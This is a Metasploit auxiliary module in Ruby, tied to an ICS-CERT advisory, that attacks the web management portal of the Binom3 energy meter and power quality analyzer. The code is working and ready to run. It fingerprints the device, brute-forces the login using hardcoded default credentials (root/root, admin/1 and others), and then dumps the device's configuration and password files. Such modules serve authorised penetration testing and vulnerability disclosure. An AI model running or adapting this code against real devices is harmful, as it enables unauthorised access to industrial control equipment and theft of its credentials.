##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name' => 'Binom3 Web Management Login Scanner, Config and Password File Dump',
      'Description' => %{
          This module scans for Binom3 Multifunctional Revenue Energy Meter and Power Quality Analyzer
          management login portal(s), and attempts to identify valid credentials.
          There are four (4) default accounts - 'root'/'root', 'admin'/'1', 'alg'/'1', 'user'/'1'.
          In addition to device config, 'root' user can also access password file.
          Other users - admin, alg, user - can only access configuration file.
          The module attempts to download configuration and password files depending on the login user credentials found.
      },
      'References' =>
        [
          ['URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-17-031-01']
        ],
      'Author' =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
        ],
      'License' => MSF_LICENSE,
      'DefaultOptions' => { 'VERBOSE' => true })
    )

    register_options(
      [
        Opt::RPORT(80),	# Application may run on a different port too. Change port accordingly.
        OptString.new('USERNAME', [false, 'A specific username to authenticate as', 'root']),
        OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'root'])
      ], self.class
    )
  end

  def run_host(ip)
    unless is_app_binom3?
      return
    end

    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  #
  # Check if App is Binom3
  #

  def is_app_binom3?
    begin
      res = send_request_cgi(
        {
          'uri' => '/',
          'method' => 'GET'
        }
      )
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      print_error("#{rhost}:#{rport} - HTTP Connection Failed...")
      return false
    end

    if (res && res.code == 200 && res.headers['Server'] && (res.headers['Server'].include?('Team-R Web') || res.body.include?('binom_ico') || res.body.include?('team-r')))

      print_good("#{rhost}:#{rport} - Binom3 confirmed...")

      return true
    else
      print_error("#{rhost}:#{rport} - Application does not appear to be Binom3. Module will not continue.")
      return false
    end
  end

  #
  # Brute-force the login page
  #

  def do_login(user, pass)
    print_status("#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}")
    begin

      res = send_request_cgi(
        {
          'uri' => '/~login',
          'method' => 'POST',
          'headers' => { 'Content-Type' => 'application/x-www-form-urlencoded' },
          'vars_post' =>
            {
              'login' => user,
              'password' => pass
            }
        }
      )

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE

      vprint_error("#{rhost}:#{rport} - HTTP Connection Failed...")
      return :abort

    end

    if (res && res.code == 302 && res.get_cookies.include?('IDSESSION'))

      print_good("SUCCESSFUL LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")

      report_cred(
        ip: rhost,
        port: rport,
        service_name: 'Binom3',
        user: user,
        password: pass
      )

      # Set Cookie

      get_cookie = res.get_cookies
      cookie = get_cookie + ' NO-HELP=true; onlyRu=1'

      # Attempting to download config file

      config_uri = '~cfg_ask_xml?type=cfg'

      res = send_request_cgi({ 'method' => 'GET', 'uri' => config_uri, 'cookie' => cookie })

      if res && res.code == 200
        vprint_status('++++++++++++++++++++++++++++++++++++++')
        vprint_status("#{rhost} - dumping configuration")
        vprint_status('++++++++++++++++++++++++++++++++++++++')

        print_good("#{rhost}:#{rport} - Configuration file retrieved successfully!")
        path = store_loot(
          'Binom3_config',
          'text/xml',
          rhost,
          res.body,
          rport,
          'Binom3 device config'
        )
        print_status("#{rhost}:#{rport} - Configuration file saved in: #{path}")
      else
        print_error("#{rhost}:#{rport} - Failed to retrieve configuration")
        return
      end

      # Attempt to dump password file
      config_uri = '~cfg_ask_xml?type=passw'
      res = send_request_cgi({ 'method' => 'GET', 'uri' => config_uri, 'cookie' => cookie })

      if res && res.code == 200
        vprint_status('++++++++++++++++++++++++++++++++++++++')
        vprint_status("#{rhost} - dumping password file")
        vprint_status('++++++++++++++++++++++++++++++++++++++')

        print_good("#{rhost}:#{rport} - Password file retrieved successfully!")
        path = store_loot(
          'Binom3_passw',
          'text/xml',
          rhost,
          res.body,
          rport,
          'Binom3 device config'
        )
        print_status("#{rhost}:#{rport} - Password file saved in: #{path}")
      else
        return
      end
    else
      print_error("FAILED LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
    end
  end
end
